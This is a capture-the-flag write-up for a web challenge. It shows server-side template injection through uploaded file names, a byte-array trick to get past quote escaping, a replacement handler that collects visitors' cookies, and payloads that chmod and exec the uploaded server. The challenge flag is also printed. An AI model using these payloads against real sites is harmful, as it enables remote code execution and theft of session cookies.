# Writeup [Files](README.md)

## Task description
**Author: roypur**

**Difficulty: hard**

**Category: web**

---

We found this file sharing site. Can you hack it?

**NB**

This challenge resets after 10 minutes.

- [files.tghack.no](https://files.tghack.no)

## Writeup

When we first open up the webpage we are greeted with a file upload prompt.
When you upload a file the filename appears below the upload form, and you can 
click the file to download it.

Since the page accepts user input you might think that
this could be an XSS task, but if you try to upload a file containing HTML, you can
see that the file is being served with the content type `text/plain charset=UTF-8`, 
which means that the
HTML won't be rendered as HTML, and that your JavaScript won't be executed.

If you try to run an XSS against the file listing page itself you
can see that the name of the file you uploaded has been sanitized.

Could this possibly be a server-side template injection (SSTI) task you may ask.
Lets find out!

Create a file with the filename `{{ 2 + 2 }}` and upload the file.
In the file listing you can now see a file with the name 4 and you have now
successfully injected something into the template of the webpage.

You can now try to run some actual Python-code to verify that you can do that.
Let us try to upload a file with the following 
filename `{% import os %}{{ os.listdir() }}`

Now you can see a list of files and folders in the current directory.
The two directories that stick out are the `hack` directory and 
the `uploads` directory.

If you now try to list the files in the `hack` directory by
uploading a file with `{% os %}{{ os.listdir("hack") }}` as the filename, 
you get a 500 error.
The error is caused by the quotes around the string being escaped,
and the code you actually end up executing 
is `{% import os %}{{ os.listdir(&quot;hack&quot;) }}`.

You can get around the input sanitizer by using a byte array
that you cast into a string as that would avoid using any of the characters 
replaced by the sanitizer.

```
{% import os,sys %}{{ os.listdir(str(bytes([0x68,0x61,0x63,0x6b]),sys.stdout.encoding)) }}
```

In the `/hack/challenge.py` file you can see a comment 
that reads `TODO: Validate cookies from client`,
which could mean that some clients have cookies set.

The final part of this challenge is to get a cookie from a client, and the easiest
way to do that is to make the server save the cookies and serve them back when 
someone connects.

You can use the `challenge.py` file as a starting point by modifying the request 
handlers to save the headers of the request,
and then respond to the client with the headers from previously connected clients.

```python
class MainHandler(tornado.web.RequestHandler):
    def get(self):
        with open('/uploads/cookies.txt', 'a+') as f:
            f.write(str(self.request.headers))
        with open('/uploads/cookies.txt', 'r') as f:
            self.finish(f.read())
```

The new webserver can be uploaded using the form on the website,
but it won't be executable by default, and while you can execute a Python script
that doesn't have the executable bit set by calling `python script.py`,
 doing so would result in the
filename with the exploit being longer than the maximum size of filenames.

Before executing the new webserver you have to make it executable, something you 
can do by using `os.chmod(file, perm)`

If you uploaded the webserver to `/uploads/p.py`, you can use the following 
payload to make it executable.

```
{% import os,sys,stat %}{{ os.chmod(str(bytes([0x2f,0x75,0x70,0x6c,0x6f,0x61,0x64,0x73,0x2f,0x70,0x2e,0x70,0x79]),sys.stdout.encoding),stat.S_IRWXU) }}
```

To replace the currently running server with the new one you can 
use `os.execl(file, args)`,
and if the script was uploaded to `/uploads/p.py`, you can run it 
by using the following payload.

```
{% import os,sys %}{{ os.execl(str(bytes([0x2f,0x75,0x70,0x6c,0x6f,0x61,0x64,0x73,0x2f,0x70,0x2e,0x70,0x79]),sys.stdout.encoding),str(bytes([0x2f,0x75,0x70,0x6c,0x6f,0x61,0x64,0x73,0x2f,0x70,0x2e,0x70,0x79]),sys.stdout.encoding)) }}
```

After executing the new webserver you can reload the webpage, and you get the flag.

```
TG20{skilled_statistic_unhappily_icing}
```
